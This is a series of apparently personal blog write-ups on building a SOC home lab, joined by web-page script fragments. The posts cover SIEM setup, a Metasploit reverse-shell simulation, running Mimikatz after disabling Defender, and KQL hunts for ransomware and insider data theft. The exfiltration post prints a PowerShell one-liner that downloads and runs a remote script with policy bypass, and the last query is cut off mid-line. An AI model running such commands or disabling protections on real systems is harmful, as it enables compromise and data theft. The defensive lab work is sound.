I set up two VMs: one running Parrot Security OS, favored for penetration testing, and another with Windows for defensive security tasks and telemetry generation.\r\n\r\nCreating the virtual machines was straightforward. I allocated sufficient resources, including CPU and RAM, to ensure optimal performance. For Parrot Security OS, I configured the network settings to facilitate communication with the Windows machine. By selecting an Internal Network type, I established a private network between the VMs, isolating my lab from the internet and reducing the risk of exposure during testing.\r\n\r\n### Setting Up Sysmon for Telemetry Generation\r\n\r\nTo enhance telemetry on the Windows machine, I installed Sysmon (System Monitor), a tool that logs detailed system activity. After downloading Sysmon from the Microsoft Sysinternals website, I executed it with a configuration to capture key events, including process creation and network connections. This setup allows effective monitoring and analysis of activities, providing rich telemetry data for examination.\r\n\r\n### Integrating Splunk for Analysis\r\n\r\nNext, I installed Splunk on the Windows VM to analyze the telemetry data generated by Sysmon. Splunk is a powerful platform for searching and analyzing machine-generated data, essential for incident response. After installation, I configured Splunk to ingest the Sysmon logs by setting up a new data input and specifying the log directory. Initial searches confirmed that Splunk was capturing the data correctly.\r\n\r\nWith Sysmon and Splunk operational, my telemetry generation setup was complete, enabling analysis of security events and improving my skills in detecting and responding to potential threats.\r\n\r\n### Testing Connectivity\r\n\r\nAfter the VMs were running, I conducted connectivity tests using basic network commands like PING to ensure effective communication between them. This step confirmed that my network configuration was functioning as intended, allowing seamless data sharing. Establishing this successful connection provided a sense of accomplishment, laying the groundwork for exploring various cybersecurity tools and techniques in a controlled environment.\r\n\r\n## Conclusion\r\n\r\nWith the initial setup complete, I now have a solid foundation for my cybersecurity home lab. This environment will provide hands-on experience and help develop the skills necessary for my future as a SOC analyst. In the next part of this blog, I will explore generating telemetry data and analyzing it to uncover valuable security insights.\r\n\r\nStay Tuned!\r\n\r\nHere's the link to follow along: [Building A Basic Home Lab](https://www.youtube.com/watch?v=5iafC6vj7kM\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=2)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

This enabled me to conduct a comprehensive scan of my Windows VM, identifying open ports and services that could be potential attack vectors. This reconnaissance phase helped me understand the attack surface and assess vulnerabilities within my environment.\r\n\r\nThe scan revealed several open ports, notably Port 3389, associated with Remote Desktop Protocol (RDP). Identifying such services is crucial as they can serve as entry points for attackers seeking to exploit system weaknesses.\r\n\r\n## Crafting Malware with Metasploit\r\n\r\nAfter reconnaissance, I shifted to creating a simulated attack using Metasploit, a widely used framework for penetration testing. I crafted a reverse shell payload, a common technique used by attackers to gain unauthorized access to target systems. This exercise provided insight into the attack lifecycle and how malicious actors exploit systems.\r\n\r\nWith the malicious executable ready, I set up a listener in Metasploit to capture any incoming connections from the reverse shell. This involved configuring the Metasploit environment for potential exploitation attempts from the crafted payload.\r\n\r\n## Executing the Malware\r\n\r\nOnce the payload and listener were in place, I set up an HTTP server using Python on my attacking OS. I accessed the server from my Windows machine to download the malware. To simulate a real-world scenario, I disabled Windows Defender to allow the payload to execute unhindered.\r\n\r\nAfter running the payload, I monitored my parrot machine for an incoming connection, indicating a successful exploit. I executed basic commands like SHELL, NET USER, and IP CONFIG to generate telemetry data.\r\n\r\n## Analyzing Telemetry with Splunk\r\n\r\nWith the simulated attack executed, I turned to analyzing the telemetry generated by the activities in my lab. I configured Splunk to ingest system logs from Sysmon, setting up an index dedicated to endpoint monitoring.\r\n\r\nBy correlating telemetry data with events from the attack simulation, I gained insights into the attack lifecycle. I reviewed logs for indicators of compromise, including the creation and execution of the reverse shell. This analysis is essential for developing effective detection strategies in a real-world Security Operations Center (SOC).\r\n\r\n## Conclusion\r\n\r\nThrough these exercises, I've deepened my understanding of the attack lifecycle and the importance of telemetry in incident response. Generating and analyzing telemetry data is fundamental for any aspiring SOC analyst. In the coming days, I plan to refine my detection capabilities further and explore additional avenues for generating and analyzing telemetry.\r\n\r\nHere's the link to follow along: [Building A Basic Home Lab](https://www.youtube.com/watch?v=-8X7Ay4YCoA\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=3)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

I provisioned a new Ubuntu server virtual machine on Proxmox with 4 vCPUs, 8GB of RAM, and 160GB of disk space, ensuring it resided within VLAN 5 (my security tools network) using the IP 10.10.5.51/24. The Wazuh installation process was straightforward. After setting a static IP and configuring DNS and gateway entries, I initiated a basic update and upgrade cycle, then ran the official Wazuh installation script from their GitHub repository.\n\nOnce the installation was completed, I accessed the Wazuh dashboard via HTTPS at https://10.10.5.51, authenticated using the auto-generated credentials, and confirmed a successful deployment. With the Wazuh manager operational, the next step was deploying agents across key systems in the lab.\n\n\u003cInlineGallery images={wazuh-server-deployment} title=\"Wazuh Server Deployment\" /\u003e\n\n### Deploying Agents: Parrot OS and Docker Server Integration\n\nThe first endpoint I configured was my Parrot OS. I elevated to root and ran the prescribed commands to add the Wazuh repository, perform an update, and install the agent. I edited the agent configuration to point it at the Wazuh manager IP and verified connectivity. Upon launching the agent, it registered on the Wazuh dashboard and began transmitting logs shortly after.\n\nI replicated the same process on my Ubuntu Docker server (10.10.30.100), again ensuring root privileges, repository addition, and agent configuration. I initiated the agent and confirmed its visibility on the Wazuh interface. To extend observability into containerised environments, I proceeded to install the Wazuh Docker Listener and configured the Docker API for telemetry ingestion. I appended the required JSON configuration into the agent's config file, restarted the service, and enabled the module on the Wazuh dashboard under Settings \u003e Modules \u003e Docker Listener. Container-level logs began appearing as I restarted a few test containers to validate.\n\n\u003cInlineGallery images={agent-installation} title=\"Agent Installation Process\" /\u003e\n\n### OPNsense Firewall Agent Issues: Encountering the PID File Roadblock\n\nWith both endpoint systems operational in Wazuh, I turned my attention to integrating my OPNsense firewall (192.168.1.1) running on dedicated hardware. This step diverged significantly from the Linux-based agents, as it required enabling FreeBSD repositories and handling configuration in a constrained BSD environment. I SSHed into OPNsense, enabled SSH under System \u003e Advanced, and modified the FreeBSD.conf file to set enabled=YES. Unlike the tutorial, I found only the freebsd.conf file available, not pfsense.conf, due to architectural differences between OPNsense and pfSense.\n\nFollowing the installation instructions, I attempted to run the agent-auth binary to register the agent with the manager. However, I encountered a persistent error: agent-auth: CRITICAL (1212): Unable to create PID file. This indicated a permission or filesystem-level issue preventing the Wazuh agent from properly initialising. Further troubleshooting revealed that the ossec user and group did not exist by default. Attempts to assign ownership using chown -R ossec:ossec /var/ossec returned \"illegal group name\" errors.\n\nI manually verified write permissions by creating and removing test files under /var/ossec, which confirmed basic functionality. Despite that, the Wazuh agent daemon (wazuh-agentd) consistently failed to start. Configuration and log file reviews pointed to missing or incompatible startup routines specific to FreeBSD. I eventually confirmed that even after enabling FreeBSD package support and properly configuring ossec.conf to include the manager IP, the agent appeared on the Wazuh dashboard but failed to show \"Active\" status.\n\nAt this point, I decided to temporarily pause work on the OPNsense agent integration. The issue remained unresolved, likely due to deeper compatibility mismatches or required kernel parameters not present on the OPNsense BSD environment. I plan to revisit this with a custom-built FreeBSD agent installation script or by manually creating missing users and startup routines. But if anyone has encountered this issue, please reach out to me with suggestions, I'll really appreciate.\n\n\u003cInlineGallery images={opnsense-setup} title=\"OPNsense Firewall Configuration\" /\u003e\n\n### Deploying Nessus: Introducing Vulnerability Scanning to the Lab\n\nWith the SIEM side in partial production, I progressed to deploying Nessus for vulnerability scanning. I created a new Ubuntu VM on Proxmox with 4 vCPUs, 4 GB RAM, and 40 GB disk, assigning it the IP address 10.10.5.52/24 within VLAN 5. After configuring static networking and enabling SSH, I logged in and ran the commands to download the latest Nessus Debian package. I installed it using dpkg and started the nessusd service.\n\nAccessing Nessus via the browser at https://10.10.5.52:8834 allowed me to register for the Essentials version and input the activation key. The platform then began downloading its full set of plugins and signature files. Once installation was completed, I created a quick scan targeting the Metasploitable2 VM. Even with the basic scan template, the results after the scan show that it was successful even with limited information, confirming its functionality.\n\n\u003cInlineGallery images={nessus-deployment} title=\"Nessus Vulnerability Scanner Setup\" /\u003e\n\n### Conclusion\n\nAt this point, I had a partially complete security monitoring stack within my home lab. Wazuh was successfully collecting logs from my Parrot OS and Docker machines and even parsing Docker container activity. Nessus was active and ready to scan targets across VLAN 5. However, OPNsense integration remained incomplete due to agent startup issues tied to BSD permission handling. I plan to circle back to this issue later with a deeper understanding of BSD service management or possibly using Syslog forwarding as a temporary workaround.\n\nThis project showcases the real-world challenges of building a hybrid monitoring environment, integrating both Linux and BSD-based systems into a centralised SIEM. It's a valuable case study for anyone deploying Wazuh in a segmented network and dealing with heterogeneous operating systems. My next step will be to document the resolution of the OPNsense agent issue and expand Wazuh's use to include alert rule tuning and dashboard customisation.\n\nStay tuned for the next stage of this project as we integrate more detection and response tools.\n\n**Credits:** This walkthrough is based on Episode 3 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien. While the steps closely followed his guidance, the project was independently implemented by Samson Otori, with custom network configurations and host assignments tailored to fit a pre-existing VLAN-segmented lab environment.\n\nHere's a link to his YouTube channels:\n\n[Gerard O'Brien's Channel](https://www.youtube.com/watch?v=ytWZ6OrFEQE\u0026list=PL3ljjyal211AbTqlxSo6CGBiVqsXw8wrp\u0026index=9) "])</script><script>self.__next_f.push([1,"16:T1583,"])</script><script>self.__next_f.push([1,"\r\n# Part 3: Generating and Ingesting Telemetry\r\n\r\n## Introduction\r\n\r\nIn this third part of the MYDFIR SOC Automation Project home lab series, I dive into the critical process of generating telemetry from a Windows 10 machine and ensuring it is correctly ingested into Wazuh. By the end of this session, I would have successfully configured my system to log events, including activity from Mimikatz, and triggered a custom alert. This hands-on process not only enhances my understanding of SIEM operations but also strengthens my ability to detect and analyze security incidents effectively.\r\n\r\n## Configuring Wazuh to Ingest Sysmon Logs\r\n\r\nTo begin, I access the Wazuh configuration settings on my Windows 10 machine. When Wazuh is installed, its configuration files are located under Program Files (x86), specifically within the ek-agent folder. The key file I need to modify is ossec.conf. This file governs how logs are processed and which events are included or excluded from analysis. By default, certain event IDs are excluded using the != operator. However, for my purpose, I need to monitor processes related to Mimikatz, which requires Sysmon to be installed or Windows Security Event ID 4688 to be enabled. Since Sysmon was installed in part two of this series, I opt for that method.\r\n\r\nBefore making changes, I first create a backup of ossec.conf to safeguard against errors. This allows me to revert back if needed. I then modify the configuration to ingest Sysmon logs by adding a new entry under the localfile section. To locate the correct Sysmon channel name, I open the Windows Event Viewer, navigate to Applications and Services \u003e Microsoft \u003e Windows \u003e Sysmon, and retrieve the operational log name from the properties section. This name is then inserted into my ossec.conf file in place of the existing application log configuration.\r\n\r\n## Adjusting Log Categories and Restarting Services\r\n\r\nNext, I remove other log categories such as Application, Security, and System, ensuring that only Sysmon logs are forwarded to the Wazuh manager. Once the changes are saved, administrative privileges are required to replace the existing configuration file. After this, I restart the Wazuh service, as any configuration changes must be followed by a service restart to take effect.\r\n\r\n## Testing Telemetry with Mimikatz\r\n\r\nWith the updated configuration in place, I verify the ingestion of Sysmon logs in the Wazuh dashboard. Searching for \"Sysmon\" in the Alerts index may take some time before logs appear. To test this setup, I download and execute Mimikatz. Since Windows Defender would block this file, I must first exclude the Downloads folder from virus scanning. This is done through Windows Security settings by adding an exclusion for the Downloads directory. Also, Google Chrome may prevent the download, so I disable Safe Browsing under Privacy and Security settings in Chrome before proceeding.\r\n\r\nOnce Mimikatz is downloaded and extracted, I run it via an administrative PowerShell session and monitor Wazuh for related alerts. If no alerts appear, it is likely because Wazuh only logs events when a predefined rule is triggered. To address this, I modify the ossec.conf file on the Wazuh manager to log all events by default. This is done by enabling the logall and logall_json options in the configuration file. After saving these changes, I restart the Wazuh manager service.\r\n\r\n## Enhancing Log Archiving and Indexing\r\n\r\nTo ensure that all logs are archived and ingested into Wazuh, I also update Filebeat's configuration. This involves navigating to the Filebeat YAML configuration file and changing the archives_enabled setting from false to true. As always, after modifying configurations, I restart the Filebeat service to apply the changes.\r\n\r\nOnce the configurations are updated, I proceed to create a new index in the Wazuh dashboard for archived logs. This is done through the Stack Management section, where I define a new index pattern named wazuh-archives-*. After setting the timestamp field, I finalize the index creation. Now, when navigating to the Discover section of Wazuh, I can select my newly created index and search for logs related to Mimikatz.\r\n\r\n## Troubleshooting Log Ingestion Issues\r\n\r\nIf events are still not visible, I perform troubleshooting by inspecting the archived log files in the Wazuh manager's CLI. By navigating to /var/ossec/logs/archives/, I list the available log files and use cat and grep commands to search for Mimikatz activity. If the logs are present in the archive but not appearing in the dashboard, it indicates a delay in ingestion, which resolves over time.\r\n\r\n## Conclusion\r\n\r\nThis session underscores the importance of proper log configuration and SIEM tuning. By ensuring that all relevant events are captured and making necessary adjustments, I enhance my detection capabilities. With my telemetry now successfully feeding into Wazuh, I am well-prepared for the final part of the series, where I will further refine my detection rules and automation workflows.\r\n\r\nStay Tuned.\r\n\r\nHere's the link to follow along: [SOC Automation Project](https://www.youtube.com/watch?v=amTtlN3uvFU\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=9)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.\r\n\r\n\r\n\r\n## Environment Overview\r\n\r\nAt the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.\r\n\r\n## Implementation Details\r\n\r\nThe implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.\r\n\r\n## Key Insights\r\n\r\nThrough the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.\r\n\r\n## Future Direction\r\n\r\nWhile this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.\r\n\r\nHere's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=VAE3aVZi0Go\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=28)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).\r\n\r\n## Understanding Elasticsearch\r\n\r\nElasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.\r\n\r\n## The Power of Logstash\r\n\r\nNext is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.\r\n\r\n## Visualizing with Kibana\r\n\r\nFinally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.\r\n\r\n## Conclusion\r\n\r\nThe ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.\r\n\r\nHere's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=4AwBhXAW90Q\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=29)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.\r\n\r\nUsing Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables — DeviceFileEvents and DeviceProcessEvents — was analyzed to reconstruct the attack sequence.\r\n\r\n## Scenario Overview\r\n\r\nA new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.\r\n\r\nDuring lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:\r\n\r\n\"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin to…\"\r\n\r\nThe task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.\r\n\r\n## Preparation\r\n\r\nPrior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.\r\n\r\nThe first step was to establish a baseline of file activity to identify when the anomaly began.\r\n\r\n## Data Collection\r\n\r\nThe analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where Timestamp \u003e= ago(30m)\r\n| summarize FileEvents = count() by bin(Timestamp, 5m)\r\n| order by Timestamp asc\r\n-------------------------------------------------------\r\n\r\nResult: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.\r\n\r\n## Data Analysis\r\n\r\n### A. Mass File Modification and Extension Changes\r\n\r\nTo examine which file types were most affected, the following query was run:\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where ActionType in (\"FileRenamed\",\"FileCreated\",\"FileModified\")\r\n| extend ext = tostring(split(FileName,\".\")[-1])\r\n| summarize Count = count() by ext\r\n| order by Count desc\r\n-------------------------------------------------------\r\n\r\nObservation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes — but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.\r\n\r\n### B. Folder-Level Analysis (Staging Behaviour)\r\n\r\nTo determine where encryption occurred:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName and Timestamp \u003e= ago(30m)\r\n| where ActionType == \"FileCreated\"\r\n| summarize count() by Folder = extract(@\"^(.*)\\\\[^\\\\]+$\",1,FileName)\r\n| order by count_ desc\r\n-------------------------------------------------------\r\n\r\nResult: High activity was isolated to a single user folder — C:\\Users\\samson\\Desktop — confirming that encryption primarily targeted the Desktop directory.\r\n\r\n### C. Identifying Script Execution\r\n\r\nThe next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where DeviceName == VMName and Timestamp \u003e= ago(30m)\r\n| where FileName has_any (\"powershell\",\"pwsh\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"wmic.exe\")\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:\r\n\r\nExecutionPolicy AllSigned -NoProfile -NonInteractive -Command \"\u0026 {...}\"\r\n\r\nThe initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.\r\n\r\n### D. Tracing Child Processes and Persistence Mechanisms\r\n\r\nTo verify what PowerShell spawned:\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceProcessEvents\r\n| where DeviceName == VMName\r\n| where InitiatingProcessFileName == \"powershell.exe\"\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\\Users\\samson\\AppData\\Local\\Temp — a common ransomware staging area.\r\n\r\n### E. File Events Linked to User Folders\r\n\r\nTo focus on desktop encryption evidence:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where Timestamp \u003e= ago(24h)\r\n| where ActionType in (\"FileCreated\",\"FileRenamed\",\"FileModified\")\r\n| where FolderPath has_any(\"Desktop\",\"\\\\Users\\\\\")\r\n| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult:\r\n\r\nA file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.\r\n\r\n### F. Process Chain Correlation – Root Cause Determination\r\n\r\nFinally, to reconstruct the infection path:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where DeviceName == VMName\r\n| where Timestamp between (ago(120m) .. now())\r\n| where FileName in~ (\"powershell.exe\",\"cmd.exe\",\"services.exe\",\"svchost.exe\")\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName\r\n| order by Timestamp asc\r\n-------------------------------------------------------\r\n\r\nFindings:\r\n\r\n1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.\r\n2. This instance spawned cmd.exe, which registered background services.\r\n3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.\r\n4. These service-hosted processes performed the encryption routines on user data.\r\n\r\n\u003cInlineGallery images={pwncrypt-ransomware-investigation} title=\"PwnCrypt Ransomware Investigation and Analysis Process\" /\u003e\r\n\r\n## Investigation Summary\r\n\r\nThe analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.\r\n\r\nExecution Chain:\r\nsenseir.exe → powershell.exe → cmd.exe → services.exe → svchost.exe → file encryption (.pwncrypt)\r\n\r\n## Response and Containment\r\n\r\n1. Isolated the compromised VM from the network using Defender's Isolate Device function.\r\n2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.\r\n3. Recommended a complete VM rebuild to remove any residual persistence.\r\n4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.\r\n5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.\r\n\r\n## Documentation\r\n\r\nEach phase of this investigation — preparation, data collection, analysis, and response — was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.\r\n\r\nAll queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.\r\n\r\n## MITRE ATT\u0026CK Mapping\r\n\r\nThe PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT\u0026CK framework.\r\n\r\n1. **Initial Access (T1204.002 – User Execution)**: Infection began through manual execution of a malicious PowerShell script.\r\n2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.\r\n3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.\r\n4. **Privilege Escalation \u0026 Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.\r\n5. **Discovery (T1082)**: Enumerated user directories such as C:\\Users\\samson\\Desktop before encryption.\r\n6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).\r\n\r\nOverall, the attack followed a full ransomware kill chain — Execution → Persistence → Privilege Escalation → Defence Evasion → Impact — demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.\r\n\r\n## Improvement and Lessons Learned\r\n\r\n1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.\r\n2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.\r\n3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.\r\n4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.\r\n5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.\r\n\r\n## Conclusion\r\n\r\nThe investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.\r\n\r\nAlthough contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.\r\n\r\nThrough disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.\r\n\r\n## Important Link\r\n\r\nIf you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)\r\n"])</script><script>self.__next_f.push([1,"1b:T290f,"])</script><script>self.__next_f.push([1,"\r\n## Introduction\r\n\r\nThis threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.\r\n\r\nThe purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.\r\n\r\nMy lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.\r\n\r\n## Scenario Overview\r\n\r\nThe investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.\r\n\r\nJohn's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.\r\n\r\nThe objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.\r\n\r\n## Preparation\r\n\r\nBefore the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.\r\n\r\n- Created VM and onboarded to Microsoft Defender for Endpoint\r\n- RDP connection established to VM\r\n- Downloaded and ran MDE onboarding package\r\n- VM successfully reporting in Defender portal\r\n\r\n### PowerShell Command\r\n\r\n-------------------------------------------------------\r\npowershell\r\nInvoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\\programdata\\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\exfiltratedata.ps1\r\n-------------------------------------------------------\r\n\r\nThis command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample \"employee data,\" and simulated uploading them to an external Azure storage bucket.\r\n\r\nIn an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.\r\n\r\n## Data Collection\r\n\r\nWith the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:\r\n\r\n- DeviceFileEvents\r\n- DeviceProcessEvents\r\n- DeviceNetworkEvents\r\n\r\nI ran an initial query to confirm that new records were appearing in real time.\r\n\r\n### KQL Check for Recent Logs\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceFileEvents\r\n| order by Timestamp desc\r\n| take 10\r\n-------------------------------------------------------\r\n\r\nThe query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.\r\n\r\n## Data Analysis\r\n\r\nThe next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.\r\n\r\n### KQL – Detect Archive Process Activity\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet archive_applications = 